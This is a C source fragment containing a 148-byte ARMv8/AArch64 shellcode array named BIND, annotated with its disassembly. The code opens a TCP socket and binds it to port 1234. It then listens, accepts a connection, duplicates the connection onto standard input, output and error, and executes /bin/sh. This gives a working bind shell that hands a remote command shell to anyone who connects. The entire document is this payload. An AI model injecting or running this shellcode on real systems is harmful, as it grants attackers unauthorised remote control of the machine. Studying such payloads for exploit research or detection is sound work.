// Target architecture : ARMv8/AArch64 arm
// Endian mode         : little

#define BIND_SIZE 148

char BIND[] = {
  /* 0000 */ "\xc8\x18\x80\xd2" /* movz x8, #0xc6                      */
  /* 0004 */ "\x02\x00\x80\xd2" /* movz x2, #0                         */
  /* 0008 */ "\x21\x00\x80\xd2" /* movz x1, #0x1                       */
  /* 000C */ "\x40\x00\x80\xd2" /* movz x0, #0x2                       */
  /* 0010 */ "\x01\x00\x00\xd4" /* svc  #0                             */
  /* 0014 */ "\xe3\x03\x00\x2a" /* mov  w3, w0                         */
  /* 0018 */ "\x08\x19\x80\xd2" /* movz x8, #0xc8                      */
  /* 001C */ "\x02\x02\x80\xd2" /* movz x2, #0x10                      */
  /* 0020 */ "\x41\x00\x80\x52" /* movz w1, #0x2                       */
  /* 0024 */ "\x81\x40\xba\x72" /* movk w1, #0xd204, lsl #16           */
  /* 0028 */ "\xe1\x0f\x1f\xf8" /* str  x1, [sp, #0xfffffffffffffff0]! */
  /* 002C */ "\xe1\x03\x00\x91" /* mov  x1, sp                         */
  /* 0030 */ "\x01\x00\x00\xd4" /* svc  #0                             */
  /* 0034 */ "\x28\x19\x80\xd2" /* movz x8, #0xc9                      */
  /* 0038 */ "\x21\x00\x80\xd2" /* movz x1, #0x1                       */
  /* 003C */ "\xe0\x03\x03\x2a" /* mov  w0, w3                         */
  /* 0040 */ "\x01\x00\x00\xd4" /* svc  #0                             */
  /* 0044 */ "\x48\x19\x80\xd2" /* movz x8, #0xca                      */
  /* 0048 */ "\xe2\x03\x1f\xaa" /* mov  x2, xzr                        */
  /* 004C */ "\xe1\x03\x1f\xaa" /* mov  x1, xzr                        */
  /* 0050 */ "\xe0\x03\x03\x2a" /* mov  w0, w3                         */
  /* 0054 */ "\x01\x00\x00\xd4" /* svc  #0                             */
  /* 0058 */ "\xe3\x03\x00\x2a" /* mov  w3, w0                         */
  /* 005C */ "\x08\x03\x80\xd2" /* movz x8, #0x18                      */
  /* 0060 */ "\x61\x00\x80\xd2" /* movz x1, #0x3                       */
  /* 0064 */ "\xe0\x03\x03\x2a" /* mov  w0, w3                         */
  /* 0068 */ "\x21\x04\x00\xf1" /* subs x1, x1, #1                     */
  /* 006C */ "\x01\x00\x00\xd4" /* svc  #0                             */
  /* 0070 */ "\xa1\xff\xff\x54" /* b.ne #0x64                          */
  /* 0074 */ "\xa8\x1b\x80\xd2" /* movz x8, #0xdd                      */
  /* 0078 */ "\xe0\x45\x8c\xd2" /* movz x0, #0x622f                    */
  /* 007C */ "\x20\xcd\xad\xf2" /* movk x0, #0x6e69, lsl #16           */
  /* 0080 */ "\xe0\x65\xce\xf2" /* movk x0, #0x732f, lsl #32           */
  /* 0084 */ "\x00\x0d\xe0\xf2" /* movk x0, #0x68, lsl #48             */
  /* 0088 */ "\xe0\x03\x00\xf9" /* str  x0, [sp]                       */
  /* 008C */ "\xe0\x03\x00\x91" /* mov  x0, sp                         */
  /* 0090 */ "\x01\x00\x00\xd4" /* svc  #0                             */
};
